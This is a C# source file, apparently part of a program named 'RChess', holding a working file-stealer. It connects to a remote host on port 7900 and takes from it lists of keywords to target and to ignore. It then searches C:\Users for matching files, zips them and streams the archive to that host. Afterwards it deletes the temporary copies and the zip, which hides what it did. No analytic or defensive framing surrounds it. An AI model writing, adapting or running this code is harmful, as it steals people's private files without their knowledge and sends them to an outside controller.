using System.IO.Compression;
using System.Net.Sockets;
using System.Text;

namespace RChess
{
	class Files
	{
		static string[] ignore = Array.Empty<string>();
		static string[] target = Array.Empty<string>();
		static List<string> files = new List<string>();
		public static async Task FilesFunc(string ip)
		{
			#region get ignore and target
			TcpClient tcpClient = new TcpClient();
			while (true)
			{
				try
				{
					Thread.Sleep(1000);
					tcpClient.Connect(ip, 7900);
					break;
				}
				catch (Exception) { }
			}
			tcpClient.Client.Ttl = 240;
			Stream s = tcpClient.GetStream();

			byte[] itarr = new byte[1000];
			s.Read(itarr, 0, itarr.Length);
			ignore = Encoding.ASCII.GetString(itarr).Split('|');
			s.Read(itarr, 0, itarr.Length);
			target = Encoding.ASCII.GetString(itarr).Split('|');
			#endregion

			#region Make image
			await MakeImage(@"C:\Users");
			#endregion

			#region move to one dir
			string targetfilesd = "tf";
			Directory.CreateDirectory(targetfilesd);
			for (int i = 0; i < files.Count; i++)
			{
				try
				{
					File.Copy(files[i], $"{targetfilesd}/{Path.GetFileName(files[i])}");
				}
				catch (Exception) { }
			}
			#endregion

			#region Compress
			string filePath = "ct";
			ZipFile.CreateFromDirectory(targetfilesd, filePath, CompressionLevel.SmallestSize, false);
			#endregion

			#region Delete files
			foreach (string file in Directory.GetFiles(targetfilesd)) File.Delete(file);
			Directory.Delete(targetfilesd);
			#endregion

			#region Send

			int chunkSize = 1024;
			int packets = (int)(new FileInfo(filePath).Length / chunkSize);
			int lastChunk = (int)(new FileInfo(filePath).Length - (packets * chunkSize));
			byte[] packesbuffer = BitConverter.GetBytes(packets);
			s.Write(packesbuffer, 0, packesbuffer.Length);
			packesbuffer = BitConverter.GetBytes(lastChunk);
			s.Write(packesbuffer, 0, packesbuffer.Length);


			using (FileStream fileStream = File.OpenRead(filePath))
			{
				byte[] buffer = new byte[chunkSize];
				for (int packet = 0; packet < packets; packet++)
				{

					fileStream.Read(buffer, 0, buffer.Length);
					s.Write(buffer, 0, buffer.Length);
					Array.Clear(buffer, 0, buffer.Length);
				}
				buffer = new byte[lastChunk];
				fileStream.Read(buffer, 0, buffer.Length);
				s.Write(buffer, 0, buffer.Length);

			}
			#endregion

			#region Delete zip
			File.Delete(filePath);
			#endregion
		}
		public static async Task MakeImage(string current_path)
		{
			foreach (string ignore_item in ignore)
			{
				if (current_path.ToLower().Contains(ignore_item.ToLower())) return;
			}
			try
			{
				foreach (string directory in Directory.EnumerateDirectories(current_path))
				{
					await MakeImage(directory);
				}

				foreach (string file in Directory.EnumerateFiles(current_path))
				{
					foreach (string target_item in target)
					{
						if (file.ToLower().Contains(target_item.ToLower()) && new FileInfo(file).Length < 10000000)
						{
							files.Add(file);

						}
					}
				}

			}
			catch (Exception)
			{
			}
		}
	}
}
